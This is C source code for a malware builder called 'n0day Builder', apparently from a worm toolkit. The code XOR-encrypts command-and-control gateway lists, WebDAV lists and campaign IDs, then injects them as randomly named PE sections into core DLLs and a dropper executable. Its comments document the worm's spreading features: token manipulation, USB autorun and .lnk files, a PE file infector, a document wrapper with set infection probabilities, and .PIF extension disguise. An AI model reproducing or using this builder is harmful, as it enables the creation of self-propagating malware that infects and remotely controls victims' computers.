#include "../CORE32/main.h"

INT main(INT argc, PCHAR argv[])
{
	USER_CONFIGURATION		user_config										= {0};

	ERROR_CODE				status;

	// Binaries
	PDWORD					core32,
							core64,
							dropper;
	UINT					core32_size,
							core64_size,
							dropper_size;

	// Lists
	PDWORD					webdav_list,
							gateway_list;
	UINT					webdav_list_size,
							gateway_list_size;

	PDWORD					encrypted_list;
	DWORD					campaign_id, attack_id;

	PBYTE					checksum, ptr;
	CHAR					ascii_checksum[SIZEOF_SHA_SUM * 2 + 1]			= {0};
	CHAR					b, d;

	DWORD					key, tmp_key;

	UINT					i;



	printf("\n\n\t-=[n0day Builder]=-\n\n\tCopyright Keres Group\n\n");
	
	// Remove previously generated file
	DeleteFileA(B_OUT_FILE);

	// Check arguments
	if (argc == 1) {
		printf(USAGE_MESSAGE);
		ExitProcess(0); 
		//url_list = "..\\url_list.txt";
	} else {

		// There are multiple parms
		if ((*(PWORD)argv[1] != 0x752d) || //gateway_list
			(*(PWORD)argv[3] != 0x642d) || //payload_list
			(*(PWORD)argv[5] != 0x612d) || //arrack_id
			(*(PWORD)argv[7] != 0x772d) || //campaign_id
			(*(PWORD)argv[9] != 0x6f2d) || //output file
			(*(PWORD)argv[11] != 0x312d) || //Enables nTM
			(*(PWORD)argv[13] != 0x322d) || //Enables USB Ops
			(*(PWORD)argv[15] != 0x332d) || //Enables Autorun generator
			(*(PWORD)argv[17] != 0x342d) || //Enables the date appender
			(*(PWORD)argv[19] != 0x352d) || //Enables RTO
			(*(PWORD)argv[21] != 0x362d) || //Enables the Wrapper
			(*(PWORD)argv[23] != 0x372d) || //Enables the PE infector
			(*(PWORD)argv[25] != 0x692d) || //PE Infector switch
			(*(PWORD)argv[27] != 0x722d) || //Wrapper infector switch
			(*(PWORD)argv[29] != 0x742d) || //Number of days
			(*(PWORD)argv[31] != 0x702d) || //PIF Switch
			(argc != 33)) {

			printf(USAGE_MESSAGE);
			ExitProcess(0);

		}
	}

/*
Parameters:

	-u		Specifies the file containing the Gateway URL list. (String)
				When the worm replicates to a new system using Token
				Manipulation, the payload is downloaded from one of 
				the Gateways specified in this list.

	-d		Specifies the file containing the WEBDAV URL list. (String)
				When the worm generates a .lnk file inside the USB 
				drive, it will use the Gateways specified by the 
				list as WEBDAV hosts.

	-a		Attack ID (Integer)
				Allows the worm code to communicate with the Gateways 
				specified by the Gateway URL list.

	-w		Campaign ID (Integer)
				Allows the worm code to communicate with the Gateways 
				specified by the Gateway URL list.

	-o		Output binary (String)
				The output binary will be stored to the location specified.

	-1		Enables nTM (Boolean)
	-2		Enables all USB Ops (Boolean)
				(NOTE: Either 1 or 2 must enabled)
	-3		Enables the Autorun generator (Boolean)
	-4		Enables the date appender in the USB Wrapper (Boolean)
	-5		Enables RTO
	-6		Enables the Wrapper
	-7		Enables the PE Infector
				(NOTE: Either 3, 6 or 7 must be enabled)

	-i		PE Infector Switch (Integer)
				If 0, the PE infector is completely disabled.
				An integer between 1-100 is the percentage (or likeliness) 
					that the PE infector will target a file.
					(1 means 1/100 chance, and 100 means always infect)

	-r		Wrapper Infector Switch (Integer)
				If 0, the Wrapper is completely disabled.
				An integer between 1-100 is the percentage (or likeliness)
					that the Wrapper will infect a document.
					(1 means 1/100 chance, and 100 means always infect)

	-t		Any USB file accessed after n amount of days will be ignored.
				This includes PEs and Documents
				If 0, every file will be infected.

	-p		The likeliness that a .PIF extension will be used instead 
				of the regular .exe
				(0 means PIF will never be used, 100 means PIF will
				always be used)

Example:
builder.exe	-u gateway_list.txt
			-d webdav_list.txt
			-a 666
			-w 777
			-o dropper.exe
			-1 1						(nTM Enabled)
			-2 1						(USB Ops enabled)
			-3 1						(Will install autorun.inf in the USB)
			-4 0						(Will not append the date in the wrapped USB File)
			-5 1						(Enables RTO)
			-6 1						(Enables the Wrapper)
			-7 1						(Enables the PE infector)
			-i 50						(PE infector infects every other file)
			-r 75						(3/4th of the Docs are wrapped)
			-t 30						(Only documents accessed within the last 30 days are noticed)
			-p 50						(Half/half chance that the .PIF extension will be used)
*/

	// Build the USER_CONFIGURATION structure
	user_config.ntm					= atoi(argv[12]);
	user_config.usb					= atoi(argv[14]);
	user_config.autorun				= atoi(argv[16]);
	user_config.date				= atoi(argv[18]);
	user_config.rto					= atoi(argv[20]);
	user_config.wrapper				= atoi(argv[22]);
	user_config.pe					= atoi(argv[24]);
	user_config.pe_probability		= atoi(argv[26]);
	user_config.wrapper_probability	= atoi(argv[28]);
	user_config.ignored_days		= atoi(argv[30]);
	user_config.pif_probability		= atoi(argv[32]);

	if (!(user_config.ntm | user_config.usb)) {
		printf("[!] Configuration error: both nTM and USB Ops have been disabled!");
		return 0;
	}
	if (!(user_config.autorun | user_config.wrapper | user_config.pe) && user_config.usb) {
		printf("[!] Configuration error: USB Ops enabled, but no features selected!");
	}

	// Load CORE32
	status = read_raw_into_buffer(B_CORE32, &core32_size, (LPVOID *)&core32);
	if (!status) {
		printf("[!] Failed to load CORE32: %s\n", B_CORE32);
		return 0;
	}
	printf("[+] CORE32 Loaded\n");

	// Load CORE64
	status = read_raw_into_buffer(B_CORE64, &core64_size, (LPVOID *)&core64);
	if (!status) {
		printf("[!] Failed to load CORE64: %s\n", B_CORE64);
		return 0;
	}
	printf("[+] CORE64 Loaded\n");

	// Load Dropper
	status = read_raw_into_buffer(B_DROPPER, &dropper_size, (LPVOID *)&dropper);
	if (!status) {
		printf("[!] Failed to load DROPPER: %s\n", B_DROPPER);
		return 0;
	}
	printf("[+] DROPPER Loaded\n");

	// Load gateway list (nTM)
	status = read_raw_into_buffer((LPCSTR)argv[2], &gateway_list_size, (LPVOID *)&gateway_list);
	if (!status) {
		printf("[!] Failed to load nTM Gateway list!\n");
		return 0;
	}
	printf("[+] nTM Gateway list loaded\n");

	// Load webdav list (USB)
	status = read_raw_into_buffer((LPCSTR)argv[4], &webdav_list_size, (LPVOID *)&webdav_list);
	if (!status) {
		printf("[!] Failed to load USB Webdav List!\n");
		return 0;
	}
	printf("[+] USB Webdav list loaded\n");

	// Generate encrypted lists
	encrypted_list = (PDWORD)HeapAlloc(GetProcessHeap(), 0, (SIZE_T)(webdav_list_size + gateway_list_size + sizeof(user_config)));
	ZeroMemory((PVOID)encrypted_list, (UINT)(webdav_list_size + gateway_list_size + sizeof(user_config)));

	// Get IDs
	attack_id	= (DWORD)atoi(argv[6]);
	campaign_id	= (DWORD)atoi(argv[8]);

	// Stamp in IDs
	user_config.attack_id		= attack_id;
	user_config.campaign_id		= campaign_id;
	//*((PDWORD)((DWORD)encrypted_list + ATTACK_ID))		= attack_id;
	//*((PDWORD)((DWORD)encrypted_list + CAMPAIGN_ID))	= campaign_id;

	// Generate key
	key			= 0;
	while (	(BYTE)(key >> 24) == 0 ||
			(BYTE)(key >> 16) == 0 ||
			(BYTE)(key >> 8) == 0 ||
			(BYTE)key == 0) {

		key = key << 8;
		key = key ^ generate_random_byte_range(240);

	}
	printf("[+] Generated key\n");

	// Store key
	user_config.key = key;
	//*encrypted_list = key;

	// Copy lists
	user_config.offset_to_gates			= sizeof(user_config);
	user_config.offset_to_webdavs		= sizeof(user_config) + gateway_list_size + 1;
	user_config.size_of_gates			= gateway_list_size;
	user_config.size_of_webdavs			= webdav_list_size;
	CopyMemory((PVOID)((SIZE_T)encrypted_list + user_config.offset_to_gates), gateway_list, gateway_list_size);
	CopyMemory((PVOID)((SIZE_T)encrypted_list + user_config.offset_to_webdavs), webdav_list, webdav_list_size);

	// Copy the structure
	CopyMemory(encrypted_list, (LPVOID)&user_config, sizeof(user_config));

	// Encrypt
#ifndef DO_NOT_ENCRYPT_CORE_DATA
	tmp_key			= key;
	ptr				= (PBYTE)((SIZE_T)encrypted_list + 4);
	//BREAK;
	for (i = 0; i < (gateway_list_size + webdav_list_size + (sizeof(USER_CONFIGURATION) - 4) + 1); i++) {
		*ptr		= (BYTE)(*ptr ^ tmp_key);

		tmp_key		= tmp_key >> 8;

		if (tmp_key == 0) {
			tmp_key = key;
		}

		ptr++;
	}
	printf("[+] Encrypted list\n");
#else
	printf("[+] Warning: not encrypting lists\n");
#endif

	// Append List to both DLLs
	append_segment(encrypted_list, user_config.offset_to_webdavs + user_config.size_of_webdavs, &core32, &core32_size);
	append_segment(encrypted_list, user_config.offset_to_webdavs + user_config.size_of_webdavs, &core64, &core64_size);

	// Append CORE32 & CORE64 to DROPPER
	append_segment(core32, core32_size, &dropper, &dropper_size);
	append_segment(core64, core64_size, &dropper, &dropper_size);

	// Write file
	write_raw_to_disk((LPCSTR)argv[10], dropper, dropper_size);

	printf("[+] All operations complete!\n");

	// Cleanup FIXME

	return 0;
}

VOID append_segment(		__in			PDWORD		payload,
							__in			UINT		payload_size,
							__inout			PDWORD		*main_image,
							__inout			PUINT		main_image_size)
{
	ERROR_CODE				status;

	PIMAGE_DOS_HEADER		dos_header;
	PIMAGE_NT_HEADERS		nt_headers;
	PIMAGE_SECTION_HEADER	section_header;

	PDWORD					output_buffer;
	CHAR					char_map[]				= CHARACTER_MAP;
	CHAR					segment_name[4]			= {0};
	UINT					output_buffer_size;
	UINT					i;

	// Generate segment name
	for (i = 0; i < 3; i++) {
		segment_name[i] = (CHAR)(char_map[generate_random_byte_range(string_length((LPCSTR)char_map))]);

		if (segment_name[i] == '\0') {
			i--;
		}
	}

	// Allocate memory for new pool
	output_buffer_size	= (UINT)(payload_size + round(*main_image_size, 1000));
	output_buffer		= (PDWORD)VirtualAlloc(NULL, output_buffer_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	// Copy main image to new pool
	CopyMemory(output_buffer, *main_image, *main_image_size);

	// Deallocate main image
	VirtualFree((LPVOID)*main_image, *main_image_size, MEM_DECOMMIT);

	// Get new pool headers
	dos_header		= (PIMAGE_DOS_HEADER)output_buffer;
	nt_headers		= (PIMAGE_NT_HEADERS)((DWORD_PTR)output_buffer + dos_header->e_lfanew);

	// Set to new segment header
	section_header	= (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(nt_headers) + sizeof(IMAGE_SECTION_HEADER) * nt_headers->FileHeader.NumberOfSections);

	// Set new section information
	section_header->VirtualAddress		= ((PIMAGE_SECTION_HEADER)((DWORD_PTR)section_header - sizeof(IMAGE_SECTION_HEADER)))->VirtualAddress;
	section_header->VirtualAddress	   += round(((PIMAGE_SECTION_HEADER)((DWORD_PTR)section_header - sizeof(IMAGE_SECTION_HEADER)))->Misc.VirtualSize, nt_headers->OptionalHeader.SectionAlignment);							
	section_header->Misc.VirtualSize	= round(payload_size, nt_headers->OptionalHeader.SectionAlignment);
	section_header->SizeOfRawData		= round(payload_size, nt_headers->OptionalHeader.FileAlignment);
	section_header->Characteristics		= IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE;
	section_header->PointerToRawData	= ((PIMAGE_SECTION_HEADER)((DWORD_PTR)section_header - sizeof(IMAGE_SECTION_HEADER)))->PointerToRawData 
										+ ((PIMAGE_SECTION_HEADER)((DWORD_PTR)section_header - sizeof(IMAGE_SECTION_HEADER)))->SizeOfRawData;
	CopyMemory(section_header->Name, segment_name, 4);

	// Set header info
	nt_headers->OptionalHeader.SizeOfImage		= section_header->VirtualAddress + section_header->Misc.VirtualSize;
	nt_headers->FileHeader.NumberOfSections++;

	// Copy over data
	CopyMemory((PVOID)((DWORD_PTR)output_buffer + section_header->PointerToRawData), payload, payload_size);
	
	
	// Return info
	*main_image			= output_buffer;
	*main_image_size	= output_buffer_size;

	return;
}